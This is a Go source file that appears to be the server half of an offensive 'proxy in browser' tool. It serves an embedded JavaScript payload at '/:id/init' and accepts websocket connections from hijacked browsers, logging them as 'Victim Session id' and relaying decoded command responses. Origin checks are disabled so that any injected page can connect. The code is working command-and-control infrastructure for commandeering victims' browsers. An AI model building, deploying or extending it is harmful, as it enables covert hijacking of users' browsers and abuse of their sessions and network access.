package sessionmanager

import (
	_ "embed"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	define "github.com/esonhugh/proxyinbrowser/cmd/server/define"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

var WebsocketConnMap = SafeWebsocketConnMap{mapper: sync.Map{}}

//go:embed bundle.js
var fileContent string

func RunServer(rch define.RelayChan, buffer io.Writer) {
	router := gin.Default()
	gin.DefaultWriter = buffer
	_ = router.SetTrustedProxies(nil) // disable
	var upgrader = websocket.Upgrader{
		ReadBufferSize:  1024 * 4,
		WriteBufferSize: 1024 * 4,
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}

	router.GET("/:id/init", func(c *gin.Context) {
		c.Header("Content-Type", "application/javascript")
		c.String(http.StatusOK, strings.ReplaceAll(fileContent, "__ENDPOINT__", c.Param("id")))
	})

	// Handle WebSocket connections
	router.GET("/:id", func(c *gin.Context) {
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		if err != nil {
			// panic(err)
			log.Errorf("%s, error while Upgrading websocket connection\n", err.Error())
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}

		connId := uuid.New().String()
		WebsocketConnMap.Set(connId, conn)
		defer WebsocketConnMap.Delete(connId)
		l := log.WithField("Victim Session id", connId)

		for {
			_, p, err := conn.ReadMessage()
			if err != nil {
				// panic(err)
				l.Errorf("%s, error while reading message\n", err.Error())
				c.AbortWithError(http.StatusInternalServerError, err)
				break
			}
			p = define.Decode(p)

			var test define.RelayCommandResp
			if json.Unmarshal(p, &test) == nil {
				rch <- test
				continue
			}
			time.Sleep(1000 * time.Millisecond)
		}

	})

	router.Run(":9999")
}
